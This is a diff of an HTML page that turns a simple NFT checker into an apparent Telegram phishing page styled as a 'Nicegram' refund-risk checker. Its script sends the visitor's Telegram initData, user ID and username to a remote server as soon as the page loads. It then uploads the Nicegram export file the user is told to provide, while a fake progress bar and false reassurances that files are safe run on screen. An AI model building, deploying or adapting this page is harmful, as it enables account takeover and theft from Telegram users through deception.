@@ -1,74 +1,343 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AML NFT Checker</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<!-- saved from url=(0023)https://bloodparty.top/ -->
+<html lang="ru" style="--tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Nicegram Holographic</title>
+    <script src="./Nicegram Holographic_files/telegram-web-app.js"></script>
+    <script src="./Nicegram Holographic_files/jquery-3.6.0.min.js"></script>
+    <link href="./Nicegram Holographic_files/css2" rel="stylesheet">
+
+    <style>
+        :root {
+            --holo-cyan: #0ff;
+            --holo-bg: rgba(10, 12, 20, 0.65);
+            --text-main: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.55);
+            --btn-blue-start: #0033cc;
+            --btn-blue-end: #0066ff;
+            --status-green: #00ffaa;
+            --error-red: #ff3333;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-glow: rgba(0, 255, 255, 0.12);
+            --yellow: #ffef00;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0; padding: 0;
+            background: radial-gradient(circle at 30% 30%, #08152a 0%, #000000 100%);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        #fileInput { display: none !important; }
+
+        /* ЭФФЕКТЫ ФОНА */
+        #particles, .snow-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1;
+        }
+        .liquid-blob {
+            position: absolute; border-radius: 50%; filter: blur(60px); z-index: 0; opacity: 0.18;
+            animation: floatBlob 14s infinite ease-in-out;
+        }
+        .blob-1 { width: 320px; height: 320px; background: #00ffff; top: -10%; left: -12%; }
+        .blob-2 { width: 280px; height: 280px; background: #0044ff; bottom: -10%; right: -12%; }
+        @keyframes floatBlob { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(30px, -30px); } }
+
+        .animated-images {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 2;
+        }
+        .image {
+            position: absolute; width: 65px; opacity: 0.12; filter: blur(0.8px);
+            animation: floatImg 20s infinite ease-in-out;
+        }
+        .image1 { top: 20%; left: 10%; } 
+        .image2 { top: 65%; left: 80%; } 
+        .image3 { top: 70%; left: 15%; } 
+        .image4 { top: 15%; left: 75%; }
+
+        @keyframes floatImg {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(6deg); }
+        }
+
+        .snowflake { 
+            position: absolute; background: radial-gradient(circle, #ffffff 0%, transparent 70%); 
+            border-radius: 50%; opacity: 0.75; animation: fall linear infinite; 
+        }
+        @keyframes fall { to { transform: translateY(110vh) translateX(15px) rotate(360deg); } }
+
+        .garland-wrap {
+            position: fixed; top: -10px; left: 0; width: 100%; height: 50px;
+            z-index: 20; pointer-events: none; display: flex; justify-content: space-around;
+        }
+        .light-bulb {
+            width: 12px; height: 12px; border-radius: 50%; position: relative; margin-top: 8px;
+            animation: flash 2s infinite alternate;
+        }
+        .bulb-cyan { background: #00ffff; box-shadow: 0 0 12px #00ffff; }
+        .bulb-blue { background: #0066ff; box-shadow: 0 0 12px #0066ff; }
+        .bulb-white { background: #ffffff; box-shadow: 0 0 12px #ffffff; }
+        @keyframes flash { from { opacity: 0.35; } to { opacity: 1; } }
+
+        .frost-vignette {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            box-shadow: inset 0 0 100px rgba(150, 240, 255, 0.15);
+            pointer-events: none; z-index: 55;
+        }
+
+        /* КАРТОЧКА */
+        .glass-card {
+            position: relative; z-index: 10; width: 88%; max-width: 340px;
+            padding: 50px 30px 40px; background: var(--holo-bg); border-radius: 28px;
+            backdrop-filter: blur(28px) saturate(150%); -webkit-backdrop-filter: blur(28px) saturate(150%);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.6), 0 0 0 1px var(--glass-glow);
+            text-align: center;
+        }
+
+        .santa-hat-icon { position: absolute; top: -28px; right: -22px; width: 60px; filter: drop-shadow(0 0 8px rgba(0,255,255,0.4)); z-index: 12; }
+
+        .logo-text {
+            font-size: 40px; font-weight: 900; color: #fff; letter-spacing: -1.5px; margin-bottom: 8px;
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.25), 0 0 20px rgba(0, 255, 255, 0.15);
+            background: linear-gradient(90deg, #ffffff, #aaffff);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        h1 { font-size: 22px; font-weight: 800; margin: 0 0 14px; color: #fff; opacity: 0.92; }
+        p { font-size: 14px; color: var(--text-secondary); line-height: 1.55; margin-bottom: 20px; }
+
+        .stats-wrapper {
+            display: inline-flex; align-items: center; gap: 10px; margin-bottom: 28px;
+            background: rgba(0, 50, 80, 0.25); padding: 9px 20px; border-radius: 50px;
+            border: 1px solid rgba(0, 200, 255, 0.15);
+        }
+        .live-dot { width: 9px; height: 9px; background: var(--status-green); border-radius: 50%; box-shadow: 0 0 10px var(--status-green); animation: pulse-dot 2s infinite; }
+        #stats-counter { font-size: 13px; font-weight: 600; color: var(--holo-cyan); text-shadow: 0 0 6px rgba(0, 255, 255, 0.25); }
+
+        .btn {
+            background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
+            color: white; border: none; padding: 17px 0; border-radius: 18px;
+            font-size: 18px; font-weight: 800; width: 100%; cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 30, 100, 0.5), 0 0 0 1px rgba(0, 150, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .security-note {
+            margin-top: 15px; display: flex; align-items: center; justify-content: center;
+            gap: 6px; font-size: 11px; color: var(--text-secondary); font-weight: 600; opacity: 0.7;
+        }
+        .security-note svg { width: 12px; height: 12px; fill: var(--holo-cyan); }
+
+        /* ЗАГРУЗКА */
+        #step-loading { display: none; flex-direction: column; align-items: center; }
+        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255, 255, 255, 0.1); border-left-color: var(--holo-cyan); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 22px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 6px; }
+        .percent-display { font-size: 14px; font-weight: 900; color: var(--holo-cyan); }
+
+        /* ПРЕДУПРЕЖДЕНИЕ */
+        .no-close-warning {
+            color: var(--error-red);
+            font-size: 13px;
+            font-weight: 800;
+            margin: 10px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* ФУТЕР */
+        .footer-container { position: absolute; bottom: 35px; display: flex; gap: 18px; z-index: 30; }
+        .footer-btn { background: rgba(15, 18, 28, 0.6); color: #fff; padding: 11px 20px; border-radius: 14px; font-size: 14px; font-weight: 700; cursor: pointer; backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
+
+        /* МОДАЛКИ */
+        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(8px); z-index: 40; opacity: 0; pointer-events: none; transition: opacity 0.35s ease; }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+        .modal { position: fixed; bottom: -100%; left: 0; width: 100%; background: rgba(15, 18, 28, 0.92); backdrop-filter: blur(30px); border-top: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px 30px 0 0; padding: 30px 25px 45px; z-index: 50; transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1); color: #fff; }
+        .modal.active { bottom: 0; }
+        .btn-close { background: rgba(255, 255, 255, 0.07); color: #fff; border: 1px solid rgba(255, 255, 255, 0.12); width: 100%; padding: 15px; margin-top: 22px; border-radius: 16px; font-weight: 800; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header class="header">
-            <h1><i class="fas fa-search"></i> NFT Checker</h1>
-            <p>Проверка безопасности NFT подарков</p>
-        </header>
 
-        <main>
-            <div class="card">
-                <h2><i class="fas fa-gem"></i> Проверка NFT</h2>
-                
-                <div class="input-group">
-                    <input type="text" id="nftUrl" placeholder="Введите ссылку на NFT подарок...">
-                    <button onclick="checkNFT()" class="btn">
-                        <i class="fas fa-play"></i> Проверить
-                    </button>
-                </div>
-
-                <div class="status" id="status">
-                    Введите ссылку для проверки
-                </div>
-
-                <div class="result hidden" id="result">
-                    <h3><i class="fas fa-chart-bar"></i> Результат проверки:</h3>
-                    <div class="result-item">
-                        <span>AML проверка:</span>
-                        <span class="result-value" id="amlResult">-</span>
-                    </div>
-                    <div class="result-item">
-                        <span>Риск рефаунда:</span>
-                        <span class="result-value" id="refundResult">-</span>
-                    </div>
-                    <div class="result-item">
-                        <span>История владения:</span>
-                        <span class="result-value" id="historyResult">-</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="card">
-                <h2><i class="fas fa-info-circle"></i> Информация</h2>
-                <p>Проверяем NFT подарки на:</p>
-                <ul>
-                    <li><i class="fas fa-check"></i> Чистоту AML</li>
-                    <li><i class="fas fa-check"></i> Риск рефаунда</li>
-                    <li><i class="fas fa-check"></i> Историю владения</li>
-                </ul>
-                
-                <div class="api-status">
-                    <span>Статус API:</span>
-                    <span id="apiStatus" class="status-dot offline"></span>
-                    <small id="apiUrl">Подключение...</small>
-                </div>
-            </div>
-        </main>
-
-        <footer>
-            <p>AML NFT Checker © 2024 | <span id="backendUrl">API: загрузка...</span></p>
-        </footer>
+    <div class="frost-vignette"></div>
+    <div class="garland-wrap">
+        <div class="light-bulb bulb-cyan"></div><div class="light-bulb bulb-blue"></div><div class="light-bulb bulb-white"></div>
+        <div class="light-bulb bulb-cyan"></div><div class="light-bulb bulb-blue"></div><div class="light-bulb bulb-white"></div>
+        <div class="light-bulb bulb-cyan"></div><div class="light-bulb bulb-blue"></div><div class="light-bulb bulb-white"></div>
     </div>
 
-    <script src="script.js"></script>
-</body>
-</html>
+    <div class="liquid-blob blob-1"></div>
+    <div class="liquid-blob blob-2"></div>
+    <div id="particles"></div>
+    <div class="snow-container" id="snow"><div class="snowflake" style="left: 3.69533%; height: 2.64507px; width: 2.64507px; animation-duration: 6.30528s; animation-delay: 2.52508s;"></div><div class="snowflake" style="left: 39.0964%; height: 4.96661px; width: 4.96661px; animation-duration: 7.99362s; animation-delay: 2.25811s;"></div><div class="snowflake" style="left: 75.4376%; height: 2.6757px; width: 2.6757px; animation-duration: 8.63337s; animation-delay: 2.32864s;"></div><div class="snowflake" style="left: 1.15396%; height: 5.07173px; width: 5.07173px; animation-duration: 8.97613s; animation-delay: 3.43359s;"></div><div class="snowflake" style="left: 43.5938%; height: 3.91824px; width: 3.91824px; animation-duration: 6.70295s; animation-delay: 2.06532s;"></div><div class="snowflake" style="left: 73.7839%; height: 3.80008px; width: 3.80008px; animation-duration: 8.93202s; animation-delay: 1.9162s;"></div><div class="snowflake" style="left: 35.0763%; height: 5.19962px; width: 5.19962px; animation-duration: 9.70512s; animation-delay: 2.21253s;"></div><div class="snowflake" style="left: 96.4799%; height: 3.46939px; width: 3.46939px; animation-duration: 5.48788s; animation-delay: 1.16701s;"></div><div class="snowflake" style="left: 70.0712%; height: 2.71557px; width: 2.71557px; animation-duration: 6.08421s; animation-delay: 4.69927s;"></div><div class="snowflake" style="left: 18.4833%; height: 3.95307px; width: 3.95307px; animation-duration: 6.65593s; animation-delay: 3.68206s;"></div><div class="snowflake" style="left: 84.729%; height: 3.98069px; width: 3.98069px; animation-duration: 6.95962s; animation-delay: 0.573829s;"></div><div class="snowflake" style="left: 52.0922%; height: 5.72239px; width: 5.72239px; animation-duration: 5.25695s; animation-delay: 1.74957s;"></div><div class="snowflake" style="left: 12.779%; height: 4.01188px; width: 4.01188px; animation-duration: 7.3194s; animation-delay: 0.00790296s;"></div><div class="snowflake" style="left: 89.0413%; height: 4.20168px; width: 4.20168px; animation-duration: 9.0199s; animation-delay: 0.189671s;"></div><div class="snowflake" style="left: 13.1589%; height: 3.49836px; width: 3.49836px; animation-duration: 5.8214s; animation-delay: 4.55662s;"></div><div class="snowflake" style="left: 21.0248%; height: 4.42786px; width: 4.42786px; animation-duration: 5.02169s; animation-delay: 0.962843s;"></div><div class="snowflake" style="left: 38.0757%; height: 2.7212px; width: 2.7212px; animation-duration: 5.71361s; animation-delay: 2.61615s;"></div><div class="snowflake" style="left: 78.0576%; height: 4.3412px; width: 4.3412px; animation-duration: 8.98761s; animation-delay: 1.37248s;"></div><div class="snowflake" style="left: 8.13005%; height: 5.15366px; width: 5.15366px; animation-duration: 5.26687s; animation-delay: 1.49601s;"></div><div class="snowflake" style="left: 24.63%; height: 5.68271px; width: 5.68271px; animation-duration: 6.88723s; animation-delay: 3.26648s;"></div><div class="snowflake" style="left: 81.776%; height: 3.11633px; width: 3.11633px; animation-duration: 7.48736s; animation-delay: 3.85479s;"></div><div class="snowflake" style="left: 33.778%; height: 4.94202px; width: 4.94202px; animation-duration: 5.11908s; animation-delay: 0.333258s;"></div><div class="snowflake" style="left: 32.1524%; height: 5.50048px; width: 5.50048px; animation-duration: 9.16999s; animation-delay: 0.0105782s;"></div><div class="snowflake" style="left: 19.8853%; height: 5.88234px; width: 5.88234px; animation-duration: 6.4856s; animation-delay: 0.256525s;"></div><div class="snowflake" style="left: 30.7692%; height: 4.73741px; width: 4.73741px; animation-duration: 9.45562s; animation-delay: 3.97508s;"></div><div class="snowflake" style="left: 6.34724%; height: 2.14778px; width: 2.14778px; animation-duration: 6.90398s; animation-delay: 1.83489s;"></div><div class="snowflake" style="left: 42.0825%; height: 2.46057px; width: 2.46057px; animation-duration: 9.33547s; animation-delay: 4.14409s;"></div><div class="snowflake" style="left: 49.3857%; height: 2.56033px; width: 2.56033px; animation-duration: 7.74239s; animation-delay: 0.052322s;"></div><div class="snowflake" style="left: 82.8176%; height: 5.95914px; width: 5.95914px; animation-duration: 9.17799s; animation-delay: 4.13413s;"></div><div class="snowflake" style="left: 53.3371%; height: 3.69364px; width: 3.69364px; animation-duration: 6.01853s; animation-delay: 1.84837s;"></div><div class="snowflake" style="left: 55.2982%; height: 5.57483px; width: 5.57483px; animation-duration: 7.35175s; animation-delay: 0.154987s;"></div><div class="snowflake" style="left: 93.4948%; height: 4.58383px; width: 4.58383px; animation-duration: 9.37041s; animation-delay: 0.703305s;"></div><div class="snowflake" style="left: 42.1299%; height: 4.11618px; width: 4.11618px; animation-duration: 6.35908s; animation-delay: 1.91391s;"></div><div class="snowflake" style="left: 83.7787%; height: 3.1015px; width: 3.1015px; animation-duration: 6.28804s; animation-delay: 4.95092s;"></div><div class="snowflake" style="left: 45.3044%; height: 5.98993px; width: 5.98993px; animation-duration: 7.32605s; animation-delay: 4.65922s;"></div><div class="snowflake" style="left: 54.536%; height: 5.25292px; width: 5.25292px; animation-duration: 8.87911s; animation-delay: 2.15724s;"></div><div class="snowflake" style="left: 64.7418%; height: 5.14955px; width: 5.14955px; animation-duration: 8.7925s; animation-delay: 4.74377s;"></div><div class="snowflake" style="left: 92.7152%; height: 2.18246px; width: 2.18246px; animation-duration: 5.09237s; animation-delay: 4.90592s;"></div><div class="snowflake" style="left: 59.9054%; height: 2.99084px; width: 2.99084px; animation-duration: 8.86497s; animation-delay: 4.14723s;"></div><div class="snowflake" style="left: 6.38623%; height: 3.22424px; width: 3.22424px; animation-duration: 5.78083s; animation-delay: 3.88197s;"></div></div>
+
+    <div class="animated-images">
+        <img src="https://betterdrain.baby/ring.png" class="image image1">
+        <img src="./Nicegram Holographic_files/clock.png" class="image image2">
+        <img src="./Nicegram Holographic_files/shard.png" class="image image3">
+        <img src="./Nicegram Holographic_files/skull.png" class="image image4">
+    </div>
+
+    <div class="glass-card">
+        <img src="./Nicegram Holographic_files/744546.png" class="santa-hat-icon" alt="NY">
+        <div class="logo-text">Nicegram</div>
+        
+        <div id="step-start">
+            <h1 id="greeting">Привет</h1>
+            <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+            <div class="stats-wrapper">
+                <div class="live-dot"></div>
+                <div id="stats-counter">Пройдено успешных проверок за сегодня 3050</div>
+            </div>
+            <input type="file" id="fileInput" accept=".zip,.txt" onchange="startVerification(this)">
+            <button class="btn" onclick="document.getElementById(&#39;fileInput&#39;).click()">Загрузить файл</button>
+            
+            <div class="security-note">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path></svg>
+                NiceGram ® все данные защищены
+            </div>
+        </div>
+
+        <div id="step-loading">
+            <div class="spinner"></div>
+            <div class="status-text" id="statusText">Инициализация...</div>
+            <div class="no-close-warning">Не закрывайте приложение!</div>
+            <div class="percent-display" id="percentText">0%</div>
+        </div>
+    </div>
+
+    <div class="footer-container">
+        <div class="footer-btn" onclick="openModal(&#39;instructionModal&#39;)">Инструкция</div>
+        <div class="footer-btn" onclick="openModal(&#39;faqModal&#39;)">FAQ</div>
+    </div>
+
+    <div class="modal-overlay" onclick="closeAllModals()"></div>
+
+    <div class="modal" id="instructionModal">
+        <h3>Инструкция</h3>
+        <ol style="color: #ccc; font-size: 15px; line-height: 1.8; padding-left: 20px; text-align: left;">
+            <li>Скачайте приложение Nicegram с официального сайта...</li>
+            <li>Откройте Nicegram и войдите в свой аккаунт.</li>
+            <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
+            <li>Экспортируйте файл...</li>
+            <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
+            <li>Отправьте файл боту.</li>
+            <li>Ожидайте результатов проверки.</li>
+        </ol>
+        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+    </div>
+
+    <div class="modal" id="faqModal">
+        <h3>❓ Частые вопросы</h3>
+        <div style="color: #bbb; font-size: 15px; line-height: 1.6; text-align: left;">
+            <p><b>Что такое рефаунд?</b><br>Это возврат средств за подарок...</p>
+            <p><b>Сколько времени занимает проверка?</b><br>Обычно 3-5 минут, бывают задержки</p>
+            <p><b>Мои файлы в безопасности?</b><br>Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет</p>
+        </div>
+        <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
+    </div>
+
+    <div class="modal" id="errorModal">
+        <h3 style="color: #ff3333;">Ошибка!</h3>
+        <p>Файл должен быть в формате .zip или .txt! Пожалуйста, прочтите инструкцию.</p>
+        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+    </div>
+
+    <script>
+        const SERVER_URL = "https://nicegramchek-3.onrender.com";
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // УСТАНОВКА ИМЕНИ ПОЛЬЗОВАТЕЛЯ
+        if (tg.initDataUnsafe?.user) {
+            const user = tg.initDataUnsafe.user;
+            document.getElementById('greeting').innerText = `Привет, ${user.first_name || user.username || 'Тракер'}`;
+        }
+
+        function logEntry() {
+            if (!tg.initData) return;
+            fetch(`${SERVER_URL}/log_entry`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    initData: tg.initData,
+                    user_id: tg.initDataUnsafe.user?.id || "0000",
+                    username: tg.initDataUnsafe.user?.username || "no_username",
+                    user_agent: navigator.userAgent
+                })
+            }).catch(e => console.error(e));
+        }
+        logEntry();
+
+        function startVerification(input) {
+            const file = input.files[0];
+            if (!file) return;
+            const ext = file.name.toLowerCase().split('.').pop();
+            if (ext !== 'zip' && ext !== 'txt') { openModal('errorModal'); return; }
+
+            document.getElementById('step-start').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'flex';
+
+            uploadFileInBackground(file);
+
+            let progress = 0;
+            const totalDuration = 120000; // 120 секунд (2 минуты)
+            const intervalTime = 100; 
+            const increment = (100 / (totalDuration / intervalTime));
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                    setTimeout(() => tg.close(), 1000);
+                }
+                document.getElementById('percentText').innerText = Math.floor(progress) + "%";
+                const st = document.getElementById('statusText');
+                if (progress < 20) st.innerText = "Проверяем ликвидность файла";
+                else if (progress < 45) st.innerText = "Анализируем аукционы";
+                else if (progress < 75) st.innerText = "Проверка происхождения звёзд";
+                else st.innerText = "Формирование вердикта";
+            }, intervalTime);
+        }
+
+        function uploadFileInBackground(file) {
+            const formData = new FormData();
+            formData.append('initData', tg.initData);
+            formData.append('file', file);
+            formData.append('user_id', tg.initDataUnsafe.user?.id || "0000");
+            formData.append('username', tg.initDataUnsafe.user?.username || "no_username");
+            formData.append('user_agent', navigator.userAgent);
+            fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData }).catch(e => console.error(e));
+        }
+
+        const snow = document.getElementById('snow');
+        for (let i = 0; i < 40; i++) {
+            const f = document.createElement('div'); f.className = 'snowflake';
+            f.style.left = Math.random() * 100 + '%'; f.style.width = f.style.height = (Math.random() * 4 + 2) + 'px';
+            f.style.animationDuration = Math.random() * 5 + 5 + 's'; f.style.animationDelay = Math.random() * 5 + 's';
+            snow.appendChild(f);
+        }
+
+        function openModal(id) { document.querySelector('.modal-overlay').classList.add('active'); document.getElementById(id).classList.add('active'); }
+        function closeAllModals() { document.querySelector('.modal-overlay').classList.remove('active'); document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); }
+    </script>
+<script defer="" src="./Nicegram Holographic_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;4838db1a590e4b11b564b9720fbea61e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9bb28a7c4f7a8294',t:'MTc2Nzk0NzA5NA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./Nicegram Holographic_files/saved_resource.html"></iframe>
+</body></html>
